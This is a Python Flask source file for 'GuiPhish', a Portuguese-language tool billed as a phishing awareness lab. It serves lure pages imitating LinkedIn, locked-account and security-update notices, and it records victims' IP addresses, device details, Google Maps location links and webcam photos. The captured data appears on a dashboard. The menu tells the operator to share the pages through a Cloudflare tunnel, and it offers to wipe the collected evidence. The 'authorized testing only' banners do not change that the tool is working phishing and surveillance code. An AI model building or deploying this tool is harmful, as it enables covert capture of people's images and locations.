import os
import json
import shutil
import random
import base64
from datetime import datetime
from flask import Flask, request, jsonify, send_file, redirect, session

# ================= PATHS =================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.abspath(os.path.join(BASE_DIR, ".."))

WEB_DIR = os.path.join(ROOT_DIR, "web")
TEMPLATES_DIR = os.path.join(WEB_DIR, "templates")
PAGES_DIR = os.path.join(WEB_DIR, "pages")
DATA_DIR = os.path.join(ROOT_DIR, "data")

LOGS_DIR = os.path.join(DATA_DIR, "logs")
FOTOS_DIR = os.path.join(DATA_DIR, "fotos")
RELATORIOS_DIR = os.path.join(DATA_DIR, "reports")
SESSIONS_DIR = os.path.join(DATA_DIR, "sessions")

PASTAS = [LOGS_DIR, FOTOS_DIR, RELATORIOS_DIR, SESSIONS_DIR]

for pasta in PASTAS:
    os.makedirs(pasta, exist_ok=True)

EVENTOS_FILE = os.path.join(LOGS_DIR, "eventos.jsonl")

# ================= CONFIG =================

DASHBOARD_USER = os.environ.get("DASHBOARD_USER", "admin")
DASHBOARD_PASS = os.environ.get("DASHBOARD_PASS", "guiphish")

app = Flask(__name__)
app.secret_key = os.environ.get("APP_SECRET_KEY", "guiphish_dashboard_secret")

# ================= CORES =================

BLUE = "\033[94m"
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RESET = "\033[0m"
CLEAR = "\033[2J\033[H"

# ================= BANNERS =================

BANNERS = [

f"""
{BLUE}
╔══════════════════════════════════════════════════════╗
║                  GUIPHISH                           ║
║             Security Awareness Platform              ║
╚══════════════════════════════════════════════════════╝
{RED}
        🔐 Authorized Testing Only
        📊 SOC-style Dashboard
        🐧 Kali Linux Ready
        CRIADO POR: Geovanni Andrade
{RESET}
""",

f"""
{CYAN}
██████╗ ██╗   ██╗██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
██╔════╝ ██║   ██║██║██╔══██╗██║  ██║██║██╔════╝██║ ██╔╝
██║  ███╗██║   ██║██║██████╔╝███████║██║███████╗█████╔╝
██║   ██║██║   ██║██║██╔═══╝ ██╔══██║██║╚════██║██╔═██╗
╚██████╔╝╚██████╔╝██║██║     ██║  ██║██║███████║██║  ██╗
 ╚═════╝  ╚═════╝ ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
{RED}
        🔥 Security Awareness Toolkit
        🎯 Phishing Simulation Lab
{RESET}
""",

f"""
{BLUE}
[ GUIPHISH LAB ]
------------------------------
> SOC Simulation Environment
> Behavioral Analysis Enabled
> Real-time Monitoring Active
{RED}
[ WARNING ]
Authorized testing only
{RESET}
"""
]

# ================= FUNÇÕES =================

def ler_eventos():
    if not os.path.exists(EVENTOS_FILE):
        return []

    eventos = []

    with open(EVENTOS_FILE, "r", encoding="utf-8") as f:
        for linha in f:
            try:
                eventos.append(json.loads(linha))
            except Exception:
                pass

    return eventos


def classificar_risco(tempo_ms):
    if not isinstance(tempo_ms, (int, float)):
        return "N/A"

    tempo = tempo_ms / 1000

    if tempo < 2:
        return "🔴 Alto risco"
    elif tempo <= 5:
        return "🟡 Médio risco"
    else:
        return "🟢 Consciente"


def calcular_tempos(eventos):
    tempos_resposta = [
        e.get("tempo_resposta")
        for e in eventos
        if isinstance(e.get("tempo_resposta"), (int, float))
    ]

    if tempos_resposta:
        tempo_medio = round(sum(tempos_resposta) / len(tempos_resposta) / 1000, 2)
        tempo_minimo = round(min(tempos_resposta) / 1000, 2)
        tempo_maximo = round(max(tempos_resposta) / 1000, 2)
    else:
        tempo_medio = 0
        tempo_minimo = 0
        tempo_maximo = 0

    return tempo_medio, tempo_minimo, tempo_maximo


def calcular_riscos(eventos):
    risco_alto = len([e for e in eventos if e.get("risco") == "🔴 Alto risco"])
    risco_medio = len([e for e in eventos if e.get("risco") == "🟡 Médio risco"])
    risco_baixo = len([e for e in eventos if e.get("risco") == "🟢 Consciente"])

    return risco_alto, risco_medio, risco_baixo


def mostrar_logs():
    eventos = ler_eventos()

    print(f"\n{CYAN}📊 Últimos eventos:{RESET}\n")

    if not eventos:
        print(f"{YELLOW}[!] Nenhum evento registrado ainda.{RESET}\n")
        return

    for evento in eventos[-10:]:
        tempo = evento.get("tempo_resposta")
        tempo_formatado = f"{round(tempo / 1000, 2)}s" if isinstance(tempo, (int, float)) else "N/A"
        risco = evento.get("risco", "N/A")

        print(
            f"{GREEN}- {evento.get('timestamp')}{RESET} | "
            f"{evento.get('tipo')} | "
            f"{evento.get('status')} | "
            f"Tempo: {tempo_formatado} | "
            f"Risco: {risco} | "
            f"IP: {evento.get('ip')}"
        )

    print("")


def gerar_relatorio():
    eventos = ler_eventos()

    fotos = []
    if os.path.exists(FOTOS_DIR):
        fotos = [f for f in os.listdir(FOTOS_DIR) if f.endswith(".jpg")]

    total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
    total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
    total_email = len([e for e in eventos if e.get("tipo") == "email"])
    total_template = len([e for e in eventos if e.get("tipo") == "template"])

    tempo_medio, tempo_minimo, tempo_maximo = calcular_tempos(eventos)
    risco_alto, risco_medio, risco_baixo = calcular_riscos(eventos)

    nome = os.path.join(
        RELATORIOS_DIR,
        f"relatorio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    )

    with open(nome, "w", encoding="utf-8") as f:
        f.write("GuiPhish Awareness Lab - Relatório\n")
        f.write("=" * 45 + "\n\n")
        f.write(f"Gerado em: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write(f"Total de eventos: {len(eventos)}\n")
        f.write(f"Eventos de câmera: {total_camera}\n")
        f.write(f"Eventos de localização: {total_localizacao}\n")
        f.write(f"Eventos de e-mail/conta: {total_email}\n")
        f.write(f"Eventos de templates: {total_template}\n")
        f.write(f"Fotos salvas: {len(fotos)}\n\n")

        f.write("Métricas comportamentais:\n")
        f.write(f"Tempo médio de resposta: {tempo_medio}s\n")
        f.write(f"Menor tempo de resposta: {tempo_minimo}s\n")
        f.write(f"Maior tempo de resposta: {tempo_maximo}s\n\n")

        f.write("Classificação de risco:\n")
        f.write(f"Alto risco (<2s): {risco_alto}\n")
        f.write(f"Médio risco (2s a 5s): {risco_medio}\n")
        f.write(f"Consciente (>5s): {risco_baixo}\n\n")

        f.write("Últimos eventos:\n")
        for evento in eventos[-20:]:
            f.write(json.dumps(evento, ensure_ascii=False) + "\n")

    print(f"\n{GREEN}[+] Relatório gerado: {nome}{RESET}\n")


def limpar_evidencias():
    confirmacao = input(f"\n{RED}[!] Apagar dados locais? Digite SIM para confirmar: {RESET}")

    if confirmacao != "SIM":
        print(f"{YELLOW}[+] Operação cancelada.{RESET}\n")
        return

    for pasta in PASTAS:
        if os.path.exists(pasta):
            shutil.rmtree(pasta)
        os.makedirs(pasta, exist_ok=True)

    print(f"{GREEN}[+] Evidências locais apagadas com sucesso.{RESET}\n")


def menu():
    print(f"\n{CYAN}[+] GuiPhish Awareness Lab{RESET}\n")
    print("1) 📸 Testar permissão de câmera/localização")
    print("2) 🎯 Escolher template de simulação")
    print("3) 📊 Dashboard / login")
    print("4) 🧾 Gerar relatório do lab")
    print("5) 🧹 Limpar evidências locais")
    print("6) 🛑 Sair")

    return input(f"\n{BLUE}Digite a opção: {RESET}")


def menu_templates():
    print(f"\n{CYAN}[+] Escolha o template de simulação:{RESET}\n")
    print("1) 💼 Rede profissional")
    print("2) 🔒 Conta bloqueada")
    print("3) 🛡️ Atualização de segurança")
    print("4) 📧 E-mail/conta")
    print("5) ↩ Voltar")

    return input(f"\n{BLUE}Digite a opção do template: {RESET}")


def autenticado():
    return session.get("logado") is True

# ================= ROTAS PRINCIPAIS =================

@app.route("/")
def index():
    return send_file(os.path.join(TEMPLATES_DIR, "camera-check", "index.html"))


@app.route("/email")
def email():
    return send_file(os.path.join(TEMPLATES_DIR, "email-check", "index.html"))


@app.route("/linkedin")
def linkedin():
    return send_file(os.path.join(TEMPLATES_DIR, "linkedin", "index.html"))


@app.route("/conta-bloqueada")
def conta_bloqueada():
    return send_file(os.path.join(TEMPLATES_DIR, "conta-bloqueada", "index.html"))


@app.route("/atualizacao-seguranca")
def atualizacao_seguranca():
    return send_file(os.path.join(TEMPLATES_DIR, "atualizacao-seguranca", "index.html"))


@app.route("/awareness")
def awareness():
    return send_file(os.path.join(PAGES_DIR, "awareness.html"))


@app.route("/learn")
def learn():
    return send_file(os.path.join(PAGES_DIR, "learn.html"))


@app.route("/foto/<nome>")
def foto(nome):
    if not autenticado():
        return redirect("/login")

    nome_seguro = os.path.basename(nome)
    caminho = os.path.join(FOTOS_DIR, nome_seguro)

    if not os.path.exists(caminho):
        return "Foto não encontrada", 404

    return send_file(caminho)

# ================= LOGIN =================

@app.route("/login", methods=["GET", "POST"])
def login():
    erro = ""

    if request.method == "POST":
        user = request.form.get("user")
        senha = request.form.get("pass")

        if user == DASHBOARD_USER and senha == DASHBOARD_PASS:
            session["logado"] = True
            return redirect("/dashboard")

        erro = "Login inválido"

    return f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>GuiPhish Login</title>
<style>
body {{
    background: radial-gradient(circle at top, #0f172a, #020617 65%);
    color: #38bdf8;
    font-family: monospace;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 0;
}}
.card {{
    background: rgba(2, 6, 23, 0.95);
    border: 1px solid #ef4444;
    box-shadow: 0 0 30px rgba(56,189,248,0.25), 0 0 18px rgba(239,68,68,0.25);
    padding: 35px;
    border-radius: 16px;
    width: 380px;
    text-align: center;
}}
h1 {{
    color: #ef4444;
}}
input {{
    width: 90%;
    padding: 12px;
    margin: 10px 0;
    background: #020617;
    border: 1px solid #38bdf8;
    color: #38bdf8;
    border-radius: 8px;
}}
button {{
    width: 95%;
    padding: 12px;
    background: linear-gradient(90deg, #38bdf8, #ef4444);
    color: white;
    font-weight: bold;
    border: none;
    border-radius: 8px;
    cursor: pointer;
}}
.erro {{
    color: #ef4444;
    margin-top: 12px;
}}
</style>
</head>
<body>
<div class="card">
    <h1>🔐 GuiPhish</h1>
    <p>Dashboard Login</p>
    <form method="POST">
        <input name="user" placeholder="Usuário">
        <input name="pass" type="password" placeholder="Senha">
        <button>Entrar</button>
    </form>
    <p class="erro">{erro}</p>
</div>
</body>
</html>
"""


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

# ================= DASHBOARD =================

@app.route("/dashboard")
def dashboard():
    if not autenticado():
        return redirect("/login")

    eventos = ler_eventos()
    fotos = []

    if os.path.exists(FOTOS_DIR):
        fotos = sorted([f for f in os.listdir(FOTOS_DIR) if f.endswith(".jpg")], reverse=True)

    total_camera = len([e for e in eventos if e.get("tipo") == "camera"])
    total_localizacao = len([e for e in eventos if e.get("tipo") == "localizacao"])
    total_email = len([e for e in eventos if e.get("tipo") == "email"])
    total_template = len([e for e in eventos if e.get("tipo") == "template"])

    tempo_medio, tempo_minimo, tempo_maximo = calcular_tempos(eventos)
    risco_alto, risco_medio, risco_baixo = calcular_riscos(eventos)

    ultimos_eventos_html = ""

    for e in eventos[-30:][::-1]:
        maps = ""
        email_info = ""
        template_info = ""

        if e.get("google_maps") not in [None, "N/A"]:
            maps = f"<a href='{e.get('google_maps')}' target='_blank'>🌍 Google Maps</a>"

        if e.get("email_domain") not in [None, "N/A"]:
            email_info = f"<span>📧 {e.get('email_domain')}</span>"

        if e.get("template") not in [None, "N/A"]:
            template_info = f"<span>🎯 {e.get('template')}</span>"

        tempo = e.get("tempo_resposta")
        tempo_formatado = f"{round(tempo / 1000, 2)}s" if isinstance(tempo, (int, float)) else "N/A"
        risco = e.get("risco", "N/A")

        ultimos_eventos_html += f"""
        <tr>
            <td>{e.get('timestamp')}</td>
            <td>{e.get('tipo')}</td>
            <td>{e.get('status')}</td>
            <td>{e.get('ip')}</td>
            <td>{tempo_formatado}</td>
            <td>{risco}</td>
            <td>{maps} {email_info} {template_info}</td>
        </tr>
        """

    fotos_html = ""

    for foto in fotos[:30]:
        fotos_html += f"""
        <div class="photo-card">
            <img src="/foto/{foto}">
            <p>{foto}</p>
        </div>
        """

    return f"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>GuiPhish Dashboard</title>
<meta http-equiv="refresh" content="10">
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
body {{
    margin: 0;
    background: #020617;
    color: #e5e7eb;
    font-family: Arial, sans-serif;
}}
header {{
    padding: 25px;
    background: linear-gradient(90deg, #020617, #111827, #450a0a);
    border-bottom: 1px solid #38bdf8;
    display: flex;
    justify-content: space-between;
    align-items: center;
}}
header h1 {{
    color: #38bdf8;
    margin: 0;
}}
button, .btn {{
    background: linear-gradient(90deg, #38bdf8, #ef4444);
    color: white;
    border: none;
    padding: 10px 16px;
    border-radius: 8px;
    font-weight: bold;
    cursor: pointer;
    text-decoration: none;
}}
.container {{
    padding: 25px;
}}
.cards {{
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
    gap: 15px;
    margin-bottom: 25px;
}}
.card {{
    background: #0f172a;
    border: 1px solid #1f2937;
    border-radius: 14px;
    padding: 20px;
}}
.card h2 {{
    margin: 0;
    color: #ef4444;
}}
.grid {{
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 20px;
}}
.photos {{
    display: flex;
    flex-wrap: wrap;
    gap: 12px;
}}
.photo-card {{
    background: #0f172a;
    border: 1px solid #1f2937;
    border-radius: 12px;
    padding: 10px;
    width: 210px;
}}
.photo-card img {{
    width: 100%;
    border-radius: 8px;
}}
.photo-card p {{
    font-size: 11px;
    color: #94a3b8;
}}
table {{
    width: 100%;
    border-collapse: collapse;
    background: #0f172a;
    border-radius: 12px;
    overflow: hidden;
}}
th, td {{
    padding: 10px;
    border-bottom: 1px solid #1f2937;
    font-size: 13px;
}}
th {{
    color: #38bdf8;
    text-align: left;
}}
a {{
    color: #38bdf8;
}}
canvas {{
    max-height: 280px;
}}
.demo {{
    color: #f59e0b;
    font-size: 13px;
    margin-top: 6px;
}}
</style>
</head>
<body>

<header>
    <div>
        <h1>📊 GuiPhish Dashboard</h1>
        <div class="demo">🎭 Modo demonstração ao vivo ativo — atualização automática a cada 10s</div>
    </div>
    <div>
        <button onclick="location.reload()">🔄 Atualizar</button>
        <a class="btn" href="/logout">🔓 Logout</a>
    </div>
</header>

<div class="container">

    <div class="cards">
        <div class="card"><h2>{len(eventos)}</h2><p>Total de eventos</p></div>
        <div class="card"><h2>{total_camera}</h2><p>Câmera</p></div>
        <div class="card"><h2>{total_localizacao}</h2><p>Localização</p></div>
        <div class="card"><h2>{total_email}</h2><p>E-mail</p></div>
        <div class="card"><h2>{total_template}</h2><p>Templates</p></div>
        <div class="card"><h2>{tempo_medio}s</h2><p>Tempo médio</p></div>
        <div class="card"><h2>{tempo_minimo}s</h2><p>Menor tempo</p></div>
        <div class="card"><h2>{tempo_maximo}s</h2><p>Maior tempo</p></div>
        <div class="card"><h2>{risco_alto}</h2><p>🔴 Alto risco</p></div>
        <div class="card"><h2>{risco_medio}</h2><p>🟡 Médio risco</p></div>
        <div class="card"><h2>{risco_baixo}</h2><p>🟢 Consciente</p></div>
    </div>

    <div class="grid">
        <div class="card">
            <h2>📈 Eventos por tipo</h2>
            <canvas id="grafico"></canvas>
        </div>

        <div class="card">
            <h2>🧠 Classificação de risco</h2>
            <canvas id="graficoRisco"></canvas>
        </div>
    </div>

    <br>

    <div class="card">
        <h2>📸 Fotos recentes</h2>
        <div class="photos">
            {fotos_html}
        </div>
    </div>

    <br>

    <div class="card">
        <h2>📋 Últimos eventos</h2>
        <table>
            <tr>
                <th>Data/Hora</th>
                <th>Tipo</th>
                <th>Status</th>
                <th>IP</th>
                <th>Tempo</th>
                <th>Risco</th>
                <th>Detalhes</th>
            </tr>
            {ultimos_eventos_html}
        </table>
    </div>

</div>

<script>
const ctx = document.getElementById('grafico');

new Chart(ctx, {{
    type: 'bar',
    data: {{
        labels: ['Câmera', 'Localização', 'E-mail', 'Templates'],
        datasets: [{{
            label: 'Eventos',
            data: [{total_camera}, {total_localizacao}, {total_email}, {total_template}],
            backgroundColor: ['#38bdf8', '#ef4444', '#38bdf8', '#f59e0b'],
            borderColor: ['#93c5fd', '#fca5a5', '#93c5fd', '#fbbf24'],
            borderWidth: 1
        }}]
    }},
    options: {{
        plugins: {{
            legend: {{
                labels: {{
                    color: '#e5e7eb'
                }}
            }}
        }},
        scales: {{
            x: {{
                ticks: {{ color: '#e5e7eb' }}
            }},
            y: {{
                ticks: {{ color: '#e5e7eb' }}
            }}
        }}
    }}
}});

const ctxRisco = document.getElementById('graficoRisco');

new Chart(ctxRisco, {{
    type: 'bar',
    data: {{
        labels: ['Alto risco', 'Médio risco', 'Consciente'],
        datasets: [{{
            label: 'Classificação',
            data: [{risco_alto}, {risco_medio}, {risco_baixo}],
            backgroundColor: ['#ef4444', '#f59e0b', '#22c55e'],
            borderColor: ['#fca5a5', '#fbbf24', '#86efac'],
            borderWidth: 1
        }}]
    }},
    options: {{
        plugins: {{
            legend: {{
                labels: {{
                    color: '#e5e7eb'
                }}
            }}
        }},
        scales: {{
            x: {{
                ticks: {{ color: '#e5e7eb' }}
            }},
            y: {{
                ticks: {{ color: '#e5e7eb' }}
            }}
        }}
    }}
}});
</script>

</body>
</html>
"""

# ================= EVENTOS =================

@app.route("/evento", methods=["POST"])
def evento():
    data = request.json or {}

    tipo = data.get("tipo", "desconhecido")
    tempo_resposta = data.get("tempo_resposta", None)
    risco = classificar_risco(tempo_resposta)

    evento_log = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": request.remote_addr,
        "tipo": tipo,
        "acao": data.get("acao", "N/A"),
        "status": data.get("status", "N/A"),
        "template": data.get("template", "N/A"),
        "tempo_resposta": tempo_resposta,
        "risco": risco,
        "user_agent": data.get("userAgent", "N/A"),
        "platform": data.get("platform", "N/A"),
        "language": data.get("language", "N/A"),
        "timezone": data.get("timezone", "N/A"),
        "google_maps": data.get("google_maps", "N/A"),
        "email_domain": data.get("email_domain", "N/A")
    }

    with open(EVENTOS_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(evento_log, ensure_ascii=False) + "\n")

    print(f"\n{GREEN}[+] EVENTO REGISTRADO:{RESET} {tipo} | {evento_log['status']} | {risco} | IP: {request.remote_addr}")

    return jsonify({"ok": True})

# ================= CAPTURA =================

@app.route("/capture", methods=["POST"])
def capture():
    try:
        data = request.json or {}

        if "image" not in data:
            return jsonify({"ok": False, "erro": "sem imagem"}), 400

        img = data.get("image").split(",")[1]
        img_bytes = base64.b64decode(img)

        nome_arquivo = f"{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}.jpg"
        caminho = os.path.join(FOTOS_DIR, nome_arquivo)

        with open(caminho, "wb") as f:
            f.write(img_bytes)

        print(f"{GREEN}[+] FOTO SALVA:{RESET} {caminho}")

        return jsonify({"ok": True, "arquivo": nome_arquivo})

    except Exception as e:
        print(f"{RED}[-] Erro ao salvar foto:{RESET} {e}")
        return jsonify({"ok": False}), 500

# ================= MAIN =================

if __name__ == "__main__":
    print(CLEAR)
    print(random.choice(BANNERS))

    while True:
        escolha = menu()

        if escolha == "1":
            print(f"\n{GREEN}[+] Modo câmera/localização ativo. Iniciando Flask...{RESET}")
            print(f"{YELLOW}[!] Como usar:{RESET}")
            print("    Use o link principal do Cloudflare:")
            print("    https://SEU-LINK.trycloudflare.com/")
            print("")
            break

        elif escolha == "2":
            escolha_template = menu_templates()

            if escolha_template == "1":
                print(f"\n{GREEN}[+] Template Rede Profissional selecionado.{RESET}")
                print(f"{YELLOW}[!] Como usar:{RESET}")
                print("    Use o link do Cloudflare com o caminho:")
                print("    https://SEU-LINK.trycloudflare.com/linkedin")
                print("")
                break

            elif escolha_template == "2":
                print(f"\n{GREEN}[+] Template Conta Bloqueada selecionado.{RESET}")
                print(f"{YELLOW}[!] Como usar:{RESET}")
                print("    Use o link do Cloudflare com o caminho:")
                print("    https://SEU-LINK.trycloudflare.com/conta-bloqueada")
                print("")
                break

            elif escolha_template == "3":
                print(f"\n{GREEN}[+] Template Atualização de Segurança selecionado.{RESET}")
                print(f"{YELLOW}[!] Como usar:{RESET}")
                print("    Use o link do Cloudflare com o caminho:")
                print("    https://SEU-LINK.trycloudflare.com/atualizacao-seguranca")
                print("")
                break

            elif escolha_template == "4":
                print(f"\n{GREEN}[+] Template E-mail/Conta selecionado.{RESET}")
                print(f"{YELLOW}[!] Como usar:{RESET}")
                print("    Use o link do Cloudflare com o caminho:")
                print("    https://SEU-LINK.trycloudflare.com/email")
                print("")
                break

            elif escolha_template == "5":
                continue

            else:
                print(f"\n{RED}[!] Opção inválida no menu de templates.{RESET}\n")

        elif escolha == "3":
            print(f"\n{GREEN}[+] Dashboard disponível em:{RESET}")
            print("    https://SEU-LINK.trycloudflare.com/login")
            print("[+] Login padrão:")
            print(f"    usuário: {DASHBOARD_USER}")
            print(f"    senha: {DASHBOARD_PASS}\n")
            break

        elif escolha == "4":
            gerar_relatorio()

        elif escolha == "5":
            limpar_evidencias()

        elif escolha == "6":
            print(f"\n{YELLOW}[+] Saindo...{RESET}\n")
            exit()

        else:
            print(f"\n{RED}[!] Opção inválida.{RESET}\n")

    app.run(host="0.0.0.0", port=10000)
